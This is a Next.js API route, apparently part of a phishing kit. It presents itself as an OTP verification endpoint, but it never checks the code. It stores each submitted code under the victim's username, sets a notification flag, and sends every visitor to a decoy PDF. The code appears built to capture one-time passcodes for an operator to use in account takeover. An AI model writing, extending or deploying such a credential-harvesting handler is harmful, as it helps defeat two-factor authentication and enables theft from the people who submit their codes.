import { NextRequest, NextResponse } from 'next/server';
import { getMainCollection } from '@/lib/database';
import { getClientIP, getUserAgent, encodeBase64, generateRandomParam } from '@/lib/utils';

export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    const { username, code } = await request.json();
    
    if (!username || !code) {
      return NextResponse.json({ error: 'Missing verification code' }, { status: 400 });
    }

    const pagetype = code;// OTP verification page
    const notify = 0;

    const collection = await getMainCollection();
    const existingUser = await collection.findOne({ username: username });

    if (existingUser) {
      // Update existing user with OTP code
      await collection.updateOne(
        { username: username },
        { 
          $set: { 
            pagetype: pagetype, 
            notify: notify 
          } 
        }
      );
    }
    const filepath = '/file.pdf';
    const redirectUrl = filepath;
    return NextResponse.json({ success: true, redirectUrl });
  } catch (error) {
    console.error('Error submitting OTP:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}